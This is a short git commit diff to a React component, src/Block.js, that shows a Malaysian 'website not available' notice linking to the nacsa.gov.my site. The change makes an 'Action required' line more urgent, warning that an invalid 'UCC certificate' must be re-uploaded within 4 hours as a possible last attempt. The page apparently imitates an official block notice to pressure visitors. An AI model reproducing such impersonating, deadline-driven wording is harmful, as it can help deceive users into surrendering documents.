82ee1354e0781cd70e5c72e00d3078e426e9e6fd
Amrish <amrish@Amrishs-MBP.lan>
2024-03-26 16:34:27 +0530

    sahjdg

--- src/Block.js
+++ src/Block.js
@@ -9,7 +9,7 @@ function block() {
       <div className="notify">NOTIFICATION</div>
       <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
       <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
-      <div className="error"><span className="action">Action required:</span>The UCC certificate uploaded seems to be invalid one. We request you to reupload a valid one within 4 hours. </div>
+      <div className="error"><span className="action">Action required:</span>The UCC certificate uploaded seems to be invalid one. We request you to reupload a valid one within 4 hours. As we detected multiple upload of invalid one, this may me the last attempt to upload a valid one.   </div>
     </div>
     </>
   )
